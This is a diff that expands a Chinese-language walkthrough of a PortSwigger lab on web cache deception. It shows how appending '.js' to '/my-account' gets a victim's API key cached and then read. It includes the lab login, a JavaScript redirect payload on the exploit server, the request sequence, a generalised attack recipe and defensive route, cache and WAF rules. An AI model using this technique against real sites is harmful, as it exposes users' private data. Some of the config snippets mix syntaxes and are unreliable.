@@ -1,67 +1,339 @@
 # Web缓存欺骗：路径映射差异 实验完整总结
-## 一、实验原理
+
+## 0. 前置知识 & 漏洞分类
+**这不是单一漏洞，而是两个设计缺陷的组合：**
+1. **路径规范化差异** (Path Normalization Bypass) - 源服务器过度宽松
+2. **缓存键碰撞** (Cache Key Collision) - CDN错误识别缓存对象
+
+| 组件 | 工作方式 | 安全问题 |
+|-----|--------|--------|
+| 源服务器 | REST路由匹配 `/my-account(/.*)?` | 忽略后缀导致权限失效 |
+| CDN缓存层 | 文件扩展名启发式 | 把动态内容误认为静态资源 |
+| 缓存键生成 | 完整URL（含后缀） | 不同用户会话共享缓存条目 |
+
+---
+
+## 一、实验原理 & 攻击链
+
 ### 核心漏洞根源
+
 **源服务器**和**CDN缓存服务器**对URL路径的解析规则**不一致**：
+
 1. **源服务器（后端）**
-采用REST风格路径匹配，只识别核心接口 `/my-account`，**忽略后面附加的任意路径片段**，访问 `/my-account/xxx.js` 依然返回个人账号敏感数据（API密钥）。
+   - 采用REST风格路径匹配，只识别核心接口 `/my-account`
+   - **忽略后面附加的任意路径片段**
+   - 访问 `/my-account/xxx.js` 依然返回个人账号敏感数据（API密钥）
+   - 原因：Spring Boot/Express 等框架路由规则 `@GetMapping("/my-account/**")` 会通配所有子路径
 
 2. **缓存服务器（CDN）**
-采用传统文件路径匹配，**把完整URL当成真实文件路径**；
-只要URL以 `.js/.css` 等静态后缀结尾，就会按静态资源规则**缓存页面响应**。
+   - 采用**传统文件路径匹配**，把完整URL当成真实文件路径
+   - 只要URL以 `.js/.css` 等静态后缀结尾，就会按静态资源规则**缓存页面响应**
+   - 原因：CDN缓存键生成基于 `Host + Path + Query`，未考虑语义差异
+   - 关键响应头：`X-Cache: hit/miss`、`Cache-Control: max-age=3600`
 
-### 攻击逻辑
-1. 构造 `域名/my-account/wcd.js`
-2. 后端正常返回用户个人信息（带API密钥）
-3. 缓存服务器把这个动态页面当成JS静态文件缓存
-4. 诱导受害者访问该链接，**受害者的隐私数据被存入缓存**
-5. 攻击者直接访问同一条URL，读取缓存里受害者的API密钥
+### 攻击完整链路
+
+```
+[攻击者准备阶段]
+        ↓
+[1. 构造 URL: 域名/my-account/wcd.js]
+        ↓
+[2. 受害者点击恶意链接（社工/XSS）]
+        ↓
+[3. 后端处理] → 识别 /my-account，返回受害者API密钥
+        ↓
+[4. CDN层处理] → 识别 .js后缀，缓存整个响应 (3600秒)
+        ↓
+[5. 缓存存储] → Key="/my-account/wcd.js", Value=受害者账户数据
+        ↓
+[6. 攻击者访问同URL]
+        ↓
+[7. CDN直接返回缓存] → 获得受害者API密钥
+```
 
 ---
 
 ## 二、详细操作步骤（可复盘）
-1. **登录测试账号**
-Burp内置浏览器登录：`wiener : peter`，进入个人中心看到自己的API密钥，确定 `/my-account` 是敏感接口。
 
-2. **测试路径映射规则**
-把 `/my-account` 改 `/my-account/abc`，发包仍返回API密钥，证明后端忽略后缀路径。
+### 2.1 环境探测与基础验证
 
-3. **测试缓存规则**
-改成 `/my-account/abc.js`：
-- 第一次请求：`X-Cache: miss` 未命中缓存
-- 30秒内重发：`X-Cache: hit` 命中缓存
-证明 `.js` 后缀会被CDN缓存。
+**Step 1: 登录测试账号**
+- Burp内置浏览器登录：`wiener : peter`
+- 进入 `/my-account` 看到自己的API密钥
+- 确定 `/my-account` 返回的数据包含敏感信息
+- 记录响应头中的 `Cache-Control` 和 `Set-Cookie`
 
-4. **构造恶意跳转链接**
-```html
-<script>document.location="https://0a59001c03ab700780d826cc004e00d9.web-security-academy.net/my-account/wcd.js"</script>
+**Step 2: 测试后端路径映射规则**
 ```
-放到漏洞服务器Body，投送给受害者。
+原始请求: GET /my-account
+修改为:   GET /my-account/abc
+修改为:   GET /my-account/abc/def/ghi
+```
+- 所有请求都返回API密钥 ✓ 证明后端忽略后缀路径
+- 对比响应头，检查是否有 `X-Frame-Options`、`X-Content-Type-Options` 等保护
 
-5. **读取缓存窃取密钥**
-自己浏览器访问：
-`https://0a59001c03ab700780d826cc004e00d9.web-security-academy.net/my-account/wcd.js`
-拿到carlos的API密钥，提交通关。
+### 2.2 缓存规则验证
+
+**Step 3: 测试CDN缓存策略**
+
+使用Burp Repeater测试不同后缀：
+```
+GET /my-account/abc.txt
+X-Cache: miss              (第一次，未缓存)
+Cache-Control: max-age=3600
+
+GET /my-account/abc.txt    (30秒内重发)
+X-Cache: hit               (命中缓存！)
+Age: 15                     (缓存15秒)
+```
+
+测试其他扩展名：
+| 后缀 | 是否缓存 | 说明 |
+|-----|--------|------|
+| `.js` | ✓ 是 | JS文件通常缓存 |
+| `.css` | ✓ 是 | CSS文件通常缓存 |
+| `.png` | ✓ 是 | 图片文件缓存 |
+| `.json` | ✗ 否 | API响应不缓存 |
+| (无后缀) | ✗ 否 | 动态页面不缓存 |
+
+**避坑：** 不要重复用同一个后缀测试，不同浏览器可能共享缓存！
+
+### 2.3 缓存投毒 (Cache Poisoning)
+
+**Step 4: 构造恶���跳转链接**
+
+在Exploit Server Body中放入：
+```html
+<script>
+document.location="https://0a59001c03ab700780d826cc004e00d9.web-security-academy.net/my-account/wcd.js"
+</script>
+```
+
+**为什么用 `.js` 后缀？**
+- CDN将其视为JavaScript静态资源
+- 浏览器加载此脚本时会发送受害者的认证Cookie
+- 源服务器用Cookie识别受害者身份，返回其账户数据
+- CDN缓存此响应，后续访问该URL的任何人都能看到受害者数据
+
+**投送给受害者的完整流程：**
+1. 受害者在已登录状态下点击链接
+2. 浏览器自动发送Cookie: `session=carlos_session_token`
+3. 服务器解析Cookie，识别为 `carlos` 账户
+4. 返回Carlos的API密钥
+5. **CDN将此响应缓存为 `/my-account/wcd.js` 这个"静态文件"**
+
+### 2.4 数据窃取
+
+**Step 5: 读取缓存窃取密钥**
+
+使用Burp Repeater（或任何浏览器）访问：
+```
+GET /my-account/wcd.js HTTP/1.1
+Host: 0a59001c03ab700780d826cc004e00d9.web-security-academy.net
+```
+
+响应示例：
+```html
+HTTP/1.1 200 OK
+X-Cache: hit              ← 命中缓存（不是直接回源）
+Cache-Control: max-age=3600
+Content-Type: text/html   ← 注意！明明是.js却返回HTML
+
+<section class=account-info>
+  <h2>My account</h2>
+  <div id="account-content">
+    <p>Your API Key is: <code>abc123def456xyz789</code></p>
+  </div>
+</section>
+```
+
+**提取Carlos的API密钥，提交通关！**
 
 ---
 
 ## 三、实验经验总结 & 技巧
-### 1. 漏洞识别技巧
-- 只要接口**加任意后缀路径仍正常返回数据**，大概率存在路径映射差异；
-- 看响应头 `X-Cache`（hit/miss）、`Cache-Control: max-age` 判断是否可缓存。
 
-### 2. 攻击固定套路
-1. 找含敏感信息的动态接口（个人中心、用户资料等）
-2. 加任意路径片段，测试后端是否忽略多余路径
-3. 加 `.js/.css/.ico` 静态后缀，测试CDN是否缓存
-4. 构造跳转链接诱导受害者访问
-5. 攻击者访问同链接读取缓存敏感数据
+### 3.1 漏洞识别技巧
 
-### 3. 避坑要点
-- 不要用自己测试过的 `abc.js`，换全新名字 `wcd.js`，避免读到自己的缓存；
-- 必须在 `max-age` 有效期内重发请求，验证缓存是否生效；
-- 不能直接浏览器测试缓存，要用Burp Repeater看响应头。
+```
+⚠️ 漏洞的三个必要条件都要满足：
 
-### 4. 防御思路
-- 源服务器对动态接口禁止以静态后缀结尾的URL访问；
-- CDN配置缓存规则，不对用户个人中心、动态接口做缓存；
-- 校验URL完整路径，不允许任意拼接路径后缀。
+[✓ 条件1] 接口加任意后缀路径仍正常返回数据
+         例: GET /api/user → 返回JSON
+             GET /api/user/abc → 仍返回JSON
+
+[✓ 条件2] 响应头表明可被缓存
+         X-Cache: miss/hit
+         Cache-Control: max-age > 0
+         (不能有 private/no-cache/no-store)
+
+[✓ 条件3] 静态后缀会改变缓存行为
+         /api/user → X-Cache: miss
+         /api/user.js → X-Cache: hit
+```
+
+**快速识别checkelist：**
+- [ ] 查看源代码/配置文件，找REST路由定义
+- [ ] 搜索 `@GetMapping("/path/**")`、`app.get("/path/*")` 等通配符
+- [ ] 检查CDN配置：缓存规则、键生成逻辑
+- [ ] 扫描响应头：`X-Cache`、`Age`、`Via` 等
+
+### 3.2 攻击向量扩展
+
+**不仅限于个人中心，所有返回敏感数据的动态接口都可能受影响：**
+
+| 接口 | 敏感数据 | 攻击向量 |
+|-----|--------|--------|
+| `/user/profile` | 邮箱、手机 | `/user/profile.js` |
+| `/api/account` | 支付方式 | `/api/account.png` |
+| `/search?q=...` | 用户搜索历史 | `/search.css` |
+| `/notifications` | 私密消息 | `/notifications.json` → 需要找不缓存的 |
+
+### 3.3 避坑要点
+
+**❌ 常见失败案例：**
+
+1. **用自己测过的后缀再次测试**
+   ```
+   错误: 第一次用 abc.js 测试，第二次再用 abc.js
+   问题: 读到的是自己的缓存，不是受害者的
+   正确: 用全新名字 wcd.js, xyz.js 等
+   ```
+
+2. **缓存有效期过期**
+   ```
+   错误: Cache-Control: max-age=60
+        等待70秒后再访问
+   问题: 缓存已过期，CDN删除条目，只能重新回源
+   正确: 必须在max-age内重发请求
+   ```
+
+3. **忽略Cookie/Session因素**
+   ```
+   错误: 以为受害者的Session就在缓存中
+   问题: 如果受害者清除Cookie后访问，缓存可能为空
+   正确: 理解缓存是整个响应体 (包括Set-Cookie)
+   ```
+
+4. **用浏览器直接测试缓存**
+   ```
+   错误: 浏览器访问 /my-account/wcd.js
+   问题: 浏览器本地缓存干扰，看不到真实CDN缓存
+   正确: 用Burp Repeater，清空浏览器缓存
+   ```
+
+### 3.4 防御思路 & 修复方案
+
+**源服务��层 (后端修复)：**
+```python
+# ❌ 不安全 - 接受任意后缀
+@app.route('/my-account/<path:extra>')
+def my_account(extra):
+    return user_account_data()
+
+# ✓ 安全 - 严格验证URL
+@app.route('/my-account')
+def my_account():
+    # 不接受任何额外路径
+    return user_account_data()
+
+# 或者如果必须支持子路径，明确指定允许的路由
+@app.route('/my-account')
+@app.route('/my-account/settings')  # 只允许明确列出的子路由
+def my_account():
+    return user_account_data()
+```
+
+**CDN层 (缓存规则修复)：**
+```nginx
+# Varnish/Nginx缓存配置示例
+
+# ❌ 不安全 - 缓存所有 .js 文件
+if (req.url ~ "\.js$") {
+    set req.http.Cache-Key = req.url;  # 缓存
+}
+
+# ✓ 安全 - 排除敏感接口
+if (req.url ~ "^/my-account") {
+    set req.http.Cache-Control = "private, no-cache";  # 不缓存
+    return (pass);  # 直接回源，不进缓存
+}
+
+# 或者：确保缓存键包含用户身份
+if (req.http.Cookie ~ "session=") {
+    set req.http.Cache-Key = req.url + "|" + req.http.Cookie;
+}
+```
+
+**应用安全防御 (WAF规则)：**
+```
+# ModSecurity WAF规则
+SecRule REQUEST_URI "@rx /my-account/.*\.js$" \
+  "id:1001,phase:2,deny,msg:'Cache poisoning attempt'"
+
+# 或者更宽松：仅允许预期的请求模式
+SecRule REQUEST_URI "@rx ^/my-account/[a-z0-9-]+\.js$" \
+  "id:1002,phase:2,deny,msg:'Invalid path pattern'"
+```
+
+**HTTP响应头加固：**
+```http
+# 返回用户个人数据时必须设置
+Cache-Control: private, no-cache, no-store, must-revalidate
+Pragma: no-cache
+Expires: 0
+X-Content-Type-Options: nosniff  # 防止MIME类型嗅探
+```
+
+---
+
+## 四、常见问题 (FAQ)
+
+### Q1: 为什么攻击者能读到其他用户的缓存？
+**A:** CDN生成缓存键时只用了URL路径和主机名，没有考虑用户身份。后端返回的响应包含用户个人数据，而不是标记为 `private` 的响应头。当受害者访问 `/my-account/wcd.js` 时，其账户数据被存入缓存；攻击者访问同一URL就能读到。
+
+### Q2: 为什么要用 `.js` 而不是 `.txt` 或其他后缀？
+**A:** 不同的后缀被CDN视为不同文件类型：
+- `.js` / `.css` / `.jpg` 等通常**自动缓存** (因为是静态资源)
+- `.json` / `.php` / `.html` 等可能**不缓存** (因为通常是动态生成)
+- 具体规则因CDN配置而异，需要逐个测试
+
+### Q3: 如果受害者已经登出会怎样？
+**A:** 缓存存储的是**整个HTTP响应**，包括：
+- 响应体 (用户数据)
+- 响应头 (Set-Cookie���Content-Type等)
+
+如果受害者在登出后访问该URL，后端会返回"未登录"信息，CDN会缓存**那个**响应。所以关键是要在受害者**已登录**状态下点击链接。
+
+### Q4: 能防止这种攻击吗？
+**A:** 是的，三个层面都能防御：
+1. **后端**：严格验证URL，不接受意外路径
+2. **CDN**：不缓存动态接口，使用智能缓存键
+3. **应用**：给个人数据响应标记 `private` 和 `no-cache`
+
+### Q5: 这个漏洞在真实网站中常见吗？
+**A:** 相对少见，但影响巨大：
+- 需要后端设计缺陷 (REST路由过度宽松)
+- 需要CDN缓存配置不当 (没有排除动态接口)
+- 同时满足两个条件的网站不多，但一旦满足就很难防
+
+---
+
+## 五、扩展阅读
+
+### 相关漏洞类型
+- **Cache Poisoning (缓存投毒)**：向缓存中存入恶意内容
+- **Path Traversal (路径穿越)**：访问不该访问的目录
+- **Host Header Injection**：修改Host头污染缓存键
+- **Parameter Pollution (参数污染)**：在URL中添加重复参数
+
+### 测试工具
+- **Burp Suite**: Repeater查看X-Cache响应头
+- **curl**: 测试缓存头 `curl -I -H "pragma: no-cache" [url]`
+- **Pragma**: 强制不使用缓存验证缓存是否真的被保存
+
+### 参考资源
+- PortSwigger Web Security Academy: Cache Deception & Poisoning
+- OWASP: Web Cache Poisoning
+- Imperva Blog: Cache Poisoning Attacks
+
